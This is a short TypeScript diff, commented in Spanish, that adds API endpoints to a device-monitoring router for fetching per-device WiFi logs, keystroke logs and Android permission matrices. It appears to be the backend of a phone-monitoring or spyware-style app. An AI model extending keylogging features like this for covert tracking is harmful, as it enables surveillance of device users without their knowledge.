@@ -81,4 +81,31 @@ export const advancedMonitoringRouter = router({
         input.daysOld
       );
     }),
+
+  /**
+   * Obtener historial de WiFi
+   */
+  getWifiLogs: protectedProcedure
+    .input(z.object({ deviceId: z.number(), limit: z.number().default(100) }))
+    .query(async ({ input }) => {
+      return await advancedMonitoring.getWifiLogs(input.deviceId, input.limit);
+    }),
+
+  /**
+   * Obtener historial de keylogs
+   */
+  getKeylogs: protectedProcedure
+    .input(z.object({ deviceId: z.number(), limit: z.number().default(100) }))
+    .query(async ({ input }) => {
+      return await advancedMonitoring.getKeylogs(input.deviceId, input.limit);
+    }),
+
+  /**
+   * Obtener matriz de permisos de Android
+   */
+  getAndroidPermissions: protectedProcedure
+    .input(z.object({ deviceId: z.number() }))
+    .query(async ({ input }) => {
+      return await advancedMonitoring.getAndroidPermissions(input.deviceId);
+    }),
 });
